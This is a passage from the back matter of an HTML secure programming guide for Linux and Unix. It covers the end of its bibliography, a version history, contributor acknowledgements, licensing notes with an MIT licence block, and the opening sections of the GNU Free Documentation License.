></P
><P
>[TruSecure 2001]
TruSecure.
August 2001.
Open Source Security: A Look at the Security Benefits of Source Code Access.
<A
HREF="http://www.trusecure.com/html/tspub/whitepapers/open_source_security5.pdf"
TARGET="_top"
>http://www.trusecure.com/html/tspub/whitepapers/open_source_security5.pdf</A
></P
><P
>[Unknown]
<EM
>SETUID(7)</EM
>
<A
HREF="http://www.homeport.org/~adam/setuid.7.html"
TARGET="_top"
>http://www.homeport.org/~adam/setuid.7.html</A
>.</P
><P
>[Van Biesbrouck 1996]
Van Biesbrouck, Michael.
April 19, 1996.
<A
HREF="http://www.csclub.uwaterloo.ca/u/mlvanbie/cgisec"
TARGET="_top"
>http://www.csclub.uwaterloo.ca/u/mlvanbie/cgisec</A
>.</P
><P
>[van Oorschot 1994]
van Oorschot, P. and M. Wiener.
November 1994.
<SPAN
CLASS="QUOTE"
>&#8220;Parallel Collision Search with Applications to Hash Functions
and Discrete Logarithms&#8221;</SPAN
>.
Proceedings of ACM Conference on Computer and Communications Security.</P
><P
>[Venema 1996]
Venema, Wietse.
1996.
Murphy&#8217;s law and computer security.
<A
HREF="http://www.fish.com/security/murphy.html"
TARGET="_top"
>http://www.fish.com/security/murphy.html</A
></P
><P
>[Viega 2002]
Viega, John, and Gary McGraw.
2002.
Building Secure Software.
Addison-Wesley.
ISBN 0201-72152-X.</P
><P
>[Watters 1996]
Watters, Arron, Guido van Rossum, James C. Ahlstrom.
1996.
Internet Programming with Python.
NY, NY: Henry Hold and Company, Inc.</P
><P
>[Wheeler 1996]
Wheeler, David A., Bill Brykczynski, and Reginald N. Meeson, Jr.
Software Inspection: An Industry Best Practice.
1996.
Los Alamitos, CA: IEEE Computer Society Press.
IEEE Copmuter Society Press Order Number BP07340.
Library of Congress Number 95-41054.
ISBN 0-8186-7340-0.</P
><P
>[Witten 2001]
September/October 2001.
Witten, Brian, Carl Landwehr, and Michael Caloyannides.
<SPAN
CLASS="QUOTE"
>&#8220;Does Open Source Improve System Security?&#8221;</SPAN
>
IEEE Software.
pp. 57-61.
<A
HREF="http://www.computer.org/software"
TARGET="_top"
>http://www.computer.org/software</A
>&#13;</P
><P
>[Wood 1985]
Wood, Patrick H. and Stephen G. Kochan.
1985.
<EM
>Unix System Security</EM
>.
Indianapolis, Indiana: Hayden Books.
ISBN 0-8104-6267-2.</P
><P
>[Wreski 1998]
Wreski, Dave.
August 22, 1998.
<EM
>Linux Security Administrator&#8217;s Guide</EM
>.
Version 0.98.
<A
HREF="http://www.nic.com/~dave/SecurityAdminGuide/index.html"
TARGET="_top"
>http://www.nic.com/~dave/SecurityAdminGuide/index.html</A
></P
><P
>[Yoder 1998]
Yoder, Joseph and Jeffrey Barcalow.
1998.
Architectural Patterns for Enabling Application Security.
PLoP &#8217;97
<A
HREF="http://st-www.cs.uiuc.edu/~hanmer/PLoP-97/Proceedings/yoder.pdf"
TARGET="_top"
>http://st-www.cs.uiuc.edu/~hanmer/PLoP-97/Proceedings/yoder.pdf</A
></P
><P
>[Zalewski 2001]
Zalewski, Michael.
May 16-17, 2001.
Delivering Signals for Fun and Profit:
Understanding, exploiting and preventing signal-handling related
vulnerabilities.
Bindview Corporation.
<A
HREF="http://razor.bindview.com/publish/papers/signals.txt"
TARGET="_top"
>http://razor.bindview.com/publish/papers/signals.txt</A
></P
><P
>[Zoebelein 1999]
Zoebelein, Hans U.
April 1999.
The Internet Operating System Counter.
<A
HREF="http://www.leb.net/hzo/ioscount"
TARGET="_top"
>http://www.leb.net/hzo/ioscount</A
>.</P
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="DOCUMENT-HISTORY"
></A
>Appendix A. History</H1
><P
>Here are a few key events in the development of this book, starting
from most recent events:

<P
></P
><DIV
CLASS="VARIABLELIST"
><DL
><DT
>2002-10-29 David A. Wheeler</DT
><DD
><P
>Version 3.000 released, adding a new section on determining
security requirements and a discussion of the Common Criteria,
broadening the document.
Many smaller improvements were incorporated as well.</P
></DD
><DT
>2001-01-01 David A. Wheeler</DT
><DD
><P
>Version 2.70 released, adding a significant amount of additional material,
such as a significant expansion of the discussion of cross-site
malicious content, HTML/URI filtering, and handling temporary files.</P
></DD
><DT
>2000-05-24 David A. Wheeler</DT
><DD
><P
>Switched to GNU&#8217;s GFDL license, added more content.</P
></DD
><DT
>2000-04-21 David A. Wheeler</DT
><DD
><P
>Version 2.00 released, dated 21 April 2000, which switched the
document&#8217;s internal format from the Linuxdoc DTD to the DocBook DTD.
Thanks to Jorge Godoy for helping me perform the transition.</P
></DD
><DT
>2000-04-04 David A. Wheeler</DT
><DD
><P
>Version 1.60 released;
changed so that it now covers <EM
>both</EM
> Linux and Unix.
Since most of the guidelines covered both, and many/most app developers want
their apps to run on both, it made sense to cover both.</P
></DD
><DT
>2000-02-09 David A. Wheeler</DT
><DD
><P
>Noted that the document is now part of the Linux Documentation Project (LDP).</P
></DD
><DT
>1999-11-29 David A. Wheeler</DT
><DD
><P
>Initial version (1.0) completed and released to the public.</P
></DD
></DL
></DIV
></P
><P
>Note that a more detailed description of changes is available on-line
in the <SPAN
CLASS="QUOTE"
>&#8220;ChangeLog&#8221;</SPAN
> file.</P
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="ACKNOWLEDGEMENTS"
></A
>Appendix B. Acknowledgements</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>As iron sharpens iron, so one man sharpens another.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 27:17 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>My thanks to the following people who kept me honest by sending me emails
noting errors, suggesting areas to cover, asking questions, and so on.
Where email addresses are included, they&#8217;ve been
shrouded by prepending my <SPAN
CLASS="QUOTE"
>&#8220;thanks.&#8221;</SPAN
> so bulk emailers
won&#8217;t easily get these addresses; inclusion of people in this list is
<EM
>not</EM
> an authorization to send
unsolicited bulk email to them.

<P
></P
><UL
><LI
><P
>Neil Brown (thanks.neilb@cse.unsw.edu.au)</P
></LI
><LI
><P
>Martin Douda (thanks.mad@students.zcu.cz)</P
></LI
><LI
><P
>Jorge Godoy</P
></LI
><LI
><P
>Scott Ingram (thanks.scott@silver.jhuapl.edu)</P
></LI
><LI
><P
>Michael Kerrisk</P
></LI
><LI
><P
>Doug Kilpatrick</P
></LI
><LI
><P
>John Levon (levon@movementarian.org)</P
></LI
><LI
><P
>Ryan McCabe (thanks.odin@numb.org)</P
></LI
><LI
><P
>Paul Millar (thanks.paulm@astro.gla.ac.uk)</P
></LI
><LI
><P
>Chuck Phillips (thanks.cdp@peakpeak.com)</P
></LI
><LI
><P
>Martin Pool (thanks.mbp@humbug.org.au)</P
></LI
><LI
><P
>Eric S. Raymond (thanks.esr@snark.thyrsus.com)</P
></LI
><LI
><P
>Marc Welz</P
></LI
><LI
><P
>Eric Werme (thanks.werme@alpha.zk3.dec.com)</P
></LI
></UL
>&#13;</P
><P
>If you want to be on this list, please send me a constructive suggestion at
<A
HREF="mailto:dwheeler@dwheeler.com"
TARGET="_top"
>dwheeler@dwheeler.com</A
>.
If you send me a constructive suggestion, but do <EM
>not</EM
> want credit,
please let me know that when you send your suggestion, comment, or
criticism; normally I expect that people want credit, and I want to give
them that credit.
My current process is to add contributor names to this list in the document,
with more detailed explanation of their comment in the ChangeLog for
this document (available on-line).
Note that although these people have sent in ideas, the actual text is my own,
so don&#8217;t blame them for any errors that may remain.
Instead, please send me another constructive suggestion.</P
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="ABOUT-LICENSE"
></A
>Appendix C. About the Documentation License</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>A copy of the text of the edict was to be issued as law
in every province and made known to the people of every
nationality so they would be ready for that day.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Esther 3:14 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>This document is Copyright (C) 1999-2000 David A. Wheeler.
Permission is granted to copy, distribute and/or modify
this document under the terms of the GNU Free Documentation License (FDL),
Version 1.1 or any later version published by the Free Software Foundation;
with the invariant sections being <SPAN
CLASS="QUOTE"
>&#8220;About the Author&#8221;</SPAN
>,
with no Front-Cover Texts, and no Back-Cover texts.
A copy of the license is included below in
<A
HREF="#FDL"
>Appendix D</A
>.</P
><P
>These terms do permit mirroring by other web sites,
but be <EM
>sure</EM
> to do the following:

<P
></P
><UL
><LI
><P
>make sure your mirrors automatically get upgrades from the master site,</P
></LI
><LI
><P
>clearly show the location of the master site
(<A
HREF="http://www.dwheeler.com/secure-programs"
TARGET="_top"
>http://www.dwheeler.com/secure-programs</A
>), with a hypertext link
to the master site, and</P
></LI
><LI
><P
>give me (David A. Wheeler) credit as the author.</P
></LI
></UL
>&#13;</P
><P
>The first two points primarily protect me from repeatedly hearing about
obsolete bugs.
I do not want to hear about bugs I fixed a year ago, just because you
are not properly mirroring the document.
By linking to the master site,
users can check and see if your mirror is up-to-date.
I&#8217;m sensitive to the problems of sites which have very
strong security requirements and therefore cannot risk normal
connections to the Internet; if that describes your situation,
at least try to meet the other points
and try to occasionally sneakernet updates into your environment.</P
><P
>By this license, you may modify the document,
but you can&#8217;t claim that what you didn&#8217;t write is yours (i.e., plagiarism)
nor can you pretend that a modified version is identical to
the original work.
Modifying the work does not transfer copyright of the entire work to you;
this is not a <SPAN
CLASS="QUOTE"
>&#8220;public domain&#8221;</SPAN
> work in terms of copyright law.
See the license in <A
HREF="#FDL"
>Appendix D</A
> for details.
If you have questions about what the license allows, please contact me.
In most cases, it&#8217;s better if you send your changes to the master
integrator (currently David A. Wheeler), so that your changes will be
integrated with everyone else&#8217;s changes into the master copy.</P
><P
>I am not a lawyer, nevertheless, it&#8217;s my position as an author
and software developer that any code fragments
not explicitly marked otherwise are so small that their use fits under
the <SPAN
CLASS="QUOTE"
>&#8220;fair use&#8221;</SPAN
> doctrine in copyright law.
In other words, unless marked otherwise, you can use the code fragments
without any restriction at all.
Copyright law does not permit copyrighting absurdly small components
of a work
(e.g., <SPAN
CLASS="QUOTE"
>&#8220;I own all rights to B-flat and B-flat minor chords&#8221;</SPAN
>), and
the fragments not marked otherwise are of the same kind of minuscule
size when compared to real programs.
I&#8217;ve done my best to give credit for specific pieces of code
written by others.
Some of you may still be concerned about the legal status of this code,
and I want make sure that it&#8217;s clear
that you can use this code in your software.
Therefore, code fragments included directly in this document not otherwise
marked have also been released by me under the terms of the <SPAN
CLASS="QUOTE"
>&#8220;MIT license&#8221;</SPAN
>,
to ensure you that there&#8217;s no serious legal encumbrance:</P
><TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  Source code in this book not otherwise identified is
  Copyright (c) 1999-2001 David A. Wheeler.

  Permission is hereby granted, free of charge, to any person
  obtaining a copy of the source code in this book not
  otherwise identified (the "Software"), to deal in the
  Software without restriction, including without limitation
  the rights to use, copy, modify, merge, publish, distribute,
  sublicense, and/or sell copies of the Software, and to
  permit persons to whom the Software is furnished to do so,
  subject to the following conditions:

  The above copyright notice and this permission notice shall be
  included in all copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
  EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
  WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
  PURPOSE AND NONINFRINGEMENT.
  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
  LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
  OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.</PRE
></FONT
></TD
></TR
></TABLE
></DIV
><DIV
CLASS="APPENDIX"
><HR><H1
><A
NAME="FDL"
></A
>Appendix D. GNU Free Documentation License</H1
><P
>    Version 1.1, March 2000
  </P
><P
>    Copyright  2000 
    <P
CLASS="ADDRESS"
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.&nbsp;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN
CLASS="STREET"
>59 Temple Place, Suite 330</SPAN
>,&nbsp;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN
CLASS="CITY"
>Boston</SPAN
>,&nbsp;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN
CLASS="STATE"
>MA</SPAN
>&nbsp;&nbsp;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN
CLASS="POSTCODE"
>02111-1307</SPAN
>&nbsp;&nbsp;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<SPAN
CLASS="COUNTRY"
>USA</SPAN
><br>
&nbsp;&nbsp;&nbsp;&nbsp;</P
> 
    Everyone is permitted to copy and distribute verbatim copies of this license
    document, but changing it is not allowed.
  </P
><P
></P
><DIV
CLASS="VARIABLELIST"
><DL
><DT
><A
NAME="FDL-PREAMBLE"
></A
>0. PREAMBLE</DT
><DD
><P
>	  The purpose of this License is to make a manual, textbook, or other
	  written document "free" in the sense of freedom: to assure everyone
	  the effective freedom to copy and redistribute it, with or without
	  modifying it, either commercially or noncommercially. Secondarily,
	  this License preserves for the author and publisher a way to get
	  credit for their work, while not being considered responsible for
	  modifications made by others.
	</P
><P
>	  This License is a kind of "copyleft", which means that derivative
	  works of the document must themselves be free in the same sense. It
	  complements the GNU General Public License, which is a copyleft
	  license designed for free software.
	</P
><P
>	  We have designed this License in order to use it for manuals for free
	  software, because free software needs free documentation: a free
	  program should come with manuals providing the same freedoms that the
	  software does. But this License is not limited to software manuals; it
	  can be used for any textual work, regardless of subject matter or
	  whether it is published as a printed book. We recommend this License
	  principally for works whose purpose is instruction or reference.
	</P
></DD
><DT
><A
NAME="FDL-SECTION1"
></A
>1. APPLICABILITY AND DEFINITIONS</DT
><DD
><P
>	  This License applies to any manual or other work that contains a
	  notice placed by the copyright holder saying it can be distributed
	  under the terms of this License. The <A
HREF="#FDL-DOCUMENT"
>"Document" </A
>, below, refers to any such
	  manual or work. Any member of the public is a licensee, and is
	  addressed as "you".
	</P
><P
>	  A <A
HREF="#FDL-MODIFIED"
>"Modified Version"</A
> of the
	  Document means any work containing the Document or a portion of it,
	  either copied verbatim, or with modifications and/or translated into
	  another language.
	</P
><P
>	  A <A
HREF="#FDL-SECONDARY"
>"Secondary Section"</A
> is a named
	  appendix or a front-matter section of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> that deals exclusively with the
	  relationship of the publishers or authors of the <A
HREF="#FDL-DOCUMENT"
> Document</A
> to the <A
HREF="#FDL-DOCUMENT"
> Document&#8217;s</A
> overall subject (or to
	  related matters) and contains nothing that could fall directly within
	  that overall subject. (For example, if the <A
HREF="#FDL-DOCUMENT"
>Document</A
> is in part a textbook of
	  mathematics, a <A
HREF="#FDL-SECONDARY"
>Secondary Section</A
>
	  may not explain any mathematics.)  The relationship could be a matter
	  of historical connection with the subject or with related matters, or
	  of legal, commercial, philosophical, ethical or political position
	  regarding them.
	</P
><P
>	  The <A
HREF="#FDL-INVARIANT"
>"Invariant Sections"</A
> are
	  certain <A
HREF="#FDL-SECONDARY"
> Secondary Sections</A
> whose
	  titles are designated, as being those of <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
>, in the notice that
	  says that the <A
HREF="#FDL-DOCUMENT"
>Document</A
> is released
	  under this License.
	</P
><P
>	  The <A
HREF="#FDL-COVER-TEXTS"
>"Cover Texts"</A
> are certain
	  short passages of text that are listed, as <A
HREF="#FDL-COVER-TEXTS"
>Front-Cover Texts</A
> or <A
HREF="#FDL-COVER-TEXTS"
>Back-Cover Texts</A
>, in the notice that
	  says that the <A
HREF="#FDL-DOCUMENT"
>Document</A
> is released
	  under this License.
	</P
><P
>	  A <A
HREF="#FDL-TRANSPARENT"
>"Transparent"</A
> copy of the
	  <A
HREF="#FDL-DOCUMENT"
> Document</A
> means a machine-readable
	  copy, represented in a format whose specification is available to the
	  general public, whose contents can be viewed and edited directly and
	  straightforwardly with generic text editors or (for images composed of
	  pixels) generic paint programs or (for drawings) some widely available
	  drawing editor, and that is suitable for input to text formatters or
	  for automatic translation to a variety of formats suitable for input
	  to text formatters. A copy made in an otherwise <A
HREF="#FDL-TRANSPARENT"
> Transparent</A
> file format whose markup
	  has been designed to thwart or discourage subsequent modification by
	  readers is not <A
HREF="#FDL-TRANSPARENT"
>Transparent</A
>.  A
	  copy that is not <A
HREF="#FDL-TRANSPARENT"
>"Transparent"</A
>
	  is called "Opaque".
	</P
><P
>	  Examples of suitable formats for <A
HREF="#FDL-TRANSPARENT"
>Transparent</A
> copies include plain
	  ASCII without markup, Texinfo input format, LaTeX input format, SGML
	  or XML using a publicly available DTD, and standard-conforming simple
	  HTML designed for human modification. Opaque formats include
	  PostScript, PDF, proprietary formats that can be read and edited only
	  by proprietary word processors, SGML or XML for which the DTD and/or
	  processing tools are not generally available, and the
	  machine-generated HTML produced by some word processors for output
	  purposes only.
	</P
><P
>	  The <A
HREF="#FDL-TITLE-PAGE"
>"Title Page"</A
> means, for a
	  printed book, the title page itself, plus such following pages as are
	  needed to hold, legibly, the material this License requires to appear
	  in the title page. For works in formats which do not have any title
	  page as such, <A
HREF="#FDL-TITLE-PAGE"
> "Title Page"</A
>
	  means the text near the most prominent appearance of the work&#8217;s title,
	  preceding the beginning of the body of the text.
	</P
></DD
><DT
><A
NAME="FDL-SECTION2"
></A
>2. VERBATIM COPYING</DT
><DD
><P
>	  You may copy and distribute the <A
HREF="#FDL-DOCUMENT"
>Document</A
> in any medium, either
	  commercially or noncommercially, provided that this License, the
	  copyright notices, and the license notice saying this License applies
	  to the <A
HREF="#FDL-DOCUMENT"
>Document</A
> are reproduced in
	  all copies, and that you add no other conditions whatsoever to those
	  of this License. You may not use technical measures to obstruct or
	  control the reading or further copying of the copies you make or
	  distribute. However, you may accept compensation in exchange for
	  copies. If you distribute a large enough number of copies you must
	  also follow the conditions in <A
HREF="#FDL-SECTION3"
>section
	  3</A
>.
	</P
><P
>	  You may also lend copies, under the same conditions stated above, and
	  you may publicly display copies.
	</P
></DD
><DT
><A
NAME="FDL-SECTION3"
></A
>3. COPYING IN QUANTITY</DT
><DD
><P
>	  If you publish printed copies of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> numbering more than 100, and
	  the <A
HREF="#FDL-DOCUMENT"
>Document&#8217;s</A
> license notice
	  requires <A
HREF="#FDL-COVER-TEXTS"
>Cover Texts</A
>, you must
	  enclose the copies in covers that carry, clearly and legibly, all
	  these <A
HREF="#FDL-COVER-TEXTS"
>Cover Texts</A
>:  Front-Cover
	  Texts on the front cover, and Back-Cover Texts on the back cover. Both
	  covers must also clearly and legibly identify you as the publisher of
	  these copies. The front cover must present the full title with all
	  words of the title equally prominent and visible. You may add other
	  material on the covers in addition. Copying with changes limited to
	  the covers, as long as they preserve the title of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> and satisfy these conditions,
	  can be treated as verbatim copying in other respects.
	</P
><P
>	  If the required texts for either cover are too voluminous to fit
	  legibly, you should put the first ones listed (as many as fit
	  reasonably) on the actual cover, and continue the rest onto adjacent
	  pages.
	</P
><P
>	  If you publish or distribute <A
HREF="#FDL-TRANSPARENT"
>Opaque</A
> copies of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> numbering more than 100, you
	  must either include a machine-readable <A
HREF="#FDL-TRANSPARENT"
>Transparent</A
> copy along with each
	  <A
HREF="#FDL-TRANSPARENT"
>Opaque</A
> copy, or state in or
	  with each <A
HREF="#FDL-TRANSPARENT"
>Opaque</A
> copy a
	  publicly-accessible computer-network location containing a complete
	  <A
HREF="#FDL-TRANSPARENT"
> Transparent</A
> copy of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>, free of added material, which
	  the general network-using public has access to download anonymously at
	  no charge using public-standard network protocols. If you use the
	  latter option, you must take reasonably prudent steps, when you begin
	  distribution of <A
HREF="#FDL-TRANSPARENT"
>Opaque</A
> copies
	  in quantity, to ensure that this <A
HREF="#FDL-TRANSPARENT"
>Transparent</A
> copy will remain thus
	  accessible at the stated location until at least one year after the
	  last time you distribute an <A
HREF="#FDL-TRANSPARENT"
>Opaque</A
> copy (directly or through your
	  agents or retailers) of that edition to the public.
	</P
><P
>	  It is requested, but not required, that you contact the authors of the
	  <A
HREF="#FDL-DOCUMENT"
>Document</A
> well before
	  redistributing any large number of copies, to give them a chance to
	  provide you with an updated version of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>.
	</P
></DD
><DT
><A
NAME="FDL-SECTION4"
></A
>4. MODIFICATIONS</DT
><DD
><P
>	  You may copy and distribute a <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
> of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>
	  under the conditions of sections <A
HREF="#FDL-SECTION2"
>2</A
>
	  and <A
HREF="#FDL-SECTION3"
>3</A
> above, provided that you
	  release the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
> under
	  precisely this License, with the <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
> filling the role of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>, thus licensing distribution
	  and modification of the <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
> to whoever possesses a copy of it. In addition, you
	  must do these things in the <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
>:
	</P
><P
></P
><OL
TYPE="A"
><LI
><P
>		Use in the <A
HREF="#FDL-TITLE-PAGE"
>Title Page</A
> (and
		on the covers, if any) a title distinct from that of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>, and from those of
		previous versions (which should, if there were any, be listed in
		the History section of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>). You may use the same
		title as a previous version if the original publisher of that
		version gives permission.
	      </P
></LI
><LI
><P
>		List on the <A
HREF="#FDL-TITLE-PAGE"
>Title Page</A
>, as
		authors, one or more persons or entities responsible for
		authorship of the modifications in the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
>, together with at
		least five of the principal authors of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> (all of its principal
		authors, if it has less than five).
	      </P
></LI
><LI
><P
>		State on the <A
HREF="#FDL-TITLE-PAGE"
>Title Page</A
>
		the name of the publisher of the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
>, as the
		publisher.
	      </P
></LI
><LI
><P
>		Preserve all the copyright notices of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>.
	      </P
></LI
><LI
><P
>		Add an appropriate copyright notice for your modifications
		adjacent to the other copyright notices.
	      </P
></LI
><LI
><P
>		Include, immediately after the copyright notices, a license
		notice giving the public permission to use the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
> under the terms
		of this License, in the form shown in the Addendum below.
	      </P
></LI
><LI
><P
>		Preserve in that license notice the full lists of <A
HREF="#FDL-INVARIANT"
> Invariant Sections</A
> and required
		<A
HREF="#FDL-COVER-TEXTS"
>Cover Texts</A
> given in the
		<A
HREF="#FDL-DOCUMENT"
>Document&#8217;s</A
> license notice.
	      </P
></LI
><LI
><P
>		Include an unaltered copy of this License.
	      </P
></LI
><LI
><P
>		Preserve the section entitled "History", and its title, and add
		to it an item stating at least the title, year, new authors, and
		publisher of the <A
HREF="#FDL-MODIFIED"
>Modified Version
		</A
>as given on the <A
HREF="#FDL-TITLE-PAGE"
>Title
		Page</A
>.  If there is no section entitled "History" in the
		<A
HREF="#FDL-DOCUMENT"
>Document</A
>, create one stating
		the title, year, authors, and publisher of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> as given on its <A
HREF="#FDL-TITLE-PAGE"
>Title Page</A
>, then add an item
		describing the <A
HREF="#FDL-MODIFIED"
>Modified
		Version</A
> as stated in the previous sentence.
	      </P
></LI
><LI
><P
>		Preserve the network location, if any, given in the <A
HREF="#FDL-DOCUMENT"
>Document</A
> for public access to a
		<A
HREF="#FDL-TRANSPARENT"
>Transparent</A
> copy of the
		<A
HREF="#FDL-DOCUMENT"
>Document</A
>, and likewise the
		network locations given in the <A
HREF="#FDL-DOCUMENT"
>Document</A
> for previous versions it
		was based on. These may be placed in the "History" section. You
		may omit a network location for a work that was published at
		least four years before the <A
HREF="#FDL-DOCUMENT"
>Document</A
> itself, or if the
		original publisher of the version it refers to gives permission.
	      </P
></LI
><LI
><P
>		In any section entitled "Acknowledgements" or "Dedications",
		preserve the section&#8217;s title, and preserve in the section all
		the substance and tone of each of the contributor
		acknowledgements and/or dedications given therein.
	      </P
></LI
><LI
><P
>		Preserve all the <A
HREF="#FDL-INVARIANT"
>Invariant
		Sections</A
> of the <A
HREF="#FDL-DOCUMENT"
>Document</A
>, unaltered in their text
		and in their titles.  Section numbers or the equivalent are not
		considered part of the section titles.
	      </P
></LI
><LI
><P
>		Delete any section entitled "Endorsements". Such a section may
		not be included in the <A
HREF="#FDL-MODIFIED"
>Modified
		Version</A
>.
	      </P
></LI
><LI
><P
>		Do not retitle any existing section as "Endorsements" or to
		conflict in title with any <A
HREF="#FDL-INVARIANT"
>Invariant Section</A
>.
	      </P
></LI
></OL
><P
>	  If the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
> includes
	  new front-matter sections or appendices that qualify as <A
HREF="#FDL-SECONDARY"
>Secondary Sections</A
> and contain no
	  material copied from the Document, you may at your option designate
	  some or all of these sections as invariant. To do this, add their
	  titles to the list of <A
HREF="#FDL-INVARIANT"
>Invariant
	  Sections</A
> in the <A
HREF="#FDL-MODIFIED"
>Modified
	  Version&#8217;s</A
> license notice. These titles must be distinct from
	  any other section titles.
	</P
><P
>	  You may add a section entitled "Endorsements", provided it contains
	  nothing but endorsements of your <A
HREF="#FDL-MODIFIED"
>Modified
	  Version</A
> by various parties--for example, statements of peer
	  review or that the text has been approved by an organization as the
	  authoritative definition of a standard.
	</P
><P
>	  You may add a passage of up to five words as a <A
HREF="#FDL-COVER-TEXTS"
>Front-Cover Text</A
>, and a passage of up
	  to 25 words as a <A
HREF="#FDL-COVER-TEXTS"
>Back-Cover
	  Text</A
>, to the end of the list of <A
HREF="#FDL-COVER-TEXTS"
>Cover Texts</A
> in the <A
HREF="#FDL-MODIFIED"
>Modified Version</A
>.  Only one passage of
	  <A
HREF="#FDL-COVER-TEXTS"
>Front-Cover Text</A
> and one of
	  <A
HREF="#FDL-COVER-TEXTS"
>Back-Cover Text</A
> may be added by
	  (or through arrangements made by) any one entity. If the <A
HREF="#FDL-DOCUMENT"
>Document</A
> already includes a cover text
	  for the same cover, previously added by you or by arrangement made by
	  the same entity you are acting on behalf of, you may not add another;
	  but you may replace the old one, on explicit permission from the
	  previous publisher that added the old one.
	</P
><P
>	  The author(s) and publisher(s) of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> do not by this License give
	  permission to use their names for publicity for or to assert or imply
	  endorsement of any <A
HREF="#FDL-MODIFIED"
>Modified Version
	  </A
>.
	</P
></DD
><DT
><A
NAME="FDL-SECTION5"
></A
>5. COMBINING DOCUMENTS</DT
><DD
><P
>	  You may combine the <A
HREF="#FDL-DOCUMENT"
>Document</A
> with
	  other documents released under this License, under the terms defined
	  in <A
HREF="#FDL-SECTION4"
>section 4</A
> above for modified
	  versions, provided that you include in the combination all of the
	  <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
> of all of the
	  original documents, unmodified, and list them all as <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
> of your combined
	  work in its license notice.
	</P
><P
>	  The combined work need only contain one copy of this License, and
	  multiple identical <A
HREF="#FDL-INVARIANT"
>Invariant
	  Sections</A
> may be replaced with a single copy. If there are
	  multiple <A
HREF="#FDL-INVARIANT"
> Invariant Sections</A
> with
	  the same name but different contents, make the title of each such
	  section unique by adding at the end of it, in parentheses, the name of
	  the original author or publisher of that section if known, or else a
	  unique number. Make the same adjustment to the section titles in the
	  list of <A
HREF="#FDL-INVARIANT"
>Invariant Sections</A
> in the
	  license notice of the combined work.
	</P
><P
>	  In the combination, you must combine any sections entitled "History"
	  in the various original documents, forming one section entitled
	  "History"; likewise combine any sections entitled "Acknowledgements",
	  and any sections entitled "Dedications". You must delete all sections
	  entitled "Endorsements."
	</P
></DD
><DT
><A
NAME="FDL-SECTION6"
></A
>6. COLLECTIONS OF DOCUMENTS</DT
><DD
><P
>	  You may make a collection consisting of the <A
HREF="#FDL-DOCUMENT"
>Document</A
> and other documents released
	  under this License, and replace the individual copies of this License
	  in the various documents with a single copy that is included in the
	  collection, provided that you follow the rules of this License for
	  verbatim copying of each of the documents in all other respects.
	</P
><P
>	  You may extract a single document from such a collection, and
	  distribute it individually under this License, provided you insert a
	  copy of this License into the extracted document, and follow this
	  License in all other respects regarding verbatim copying of that
	  document.
	</P
></DD
><DT
